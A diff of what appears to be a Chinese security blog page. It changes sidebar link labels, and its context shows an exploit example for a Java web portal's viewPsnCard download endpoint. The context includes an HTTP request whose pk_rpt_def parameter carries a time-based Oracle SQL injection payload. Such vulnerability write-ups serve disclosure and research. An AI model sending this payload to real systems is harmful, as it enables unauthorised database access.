@@ -65,11 +65,11 @@ public class PsnCardAction extends BaseAction {
 
 深入探索
 
-漏洞修复方案
+安全研究工具
 
 安全工具下载
 
-计算机安全指南
+在线工具箱
 
 `pk_rpt_def` 带入 queryByPk 函数
 
@@ -111,7 +111,7 @@ public Collection retrieveByClause(Class className, String condition, String[] f
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用示例
 
-漏洞分析报告
+孚盟云漏洞
 
 ```
 GET /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--&pk_psnjob=1 HTTP/1.1
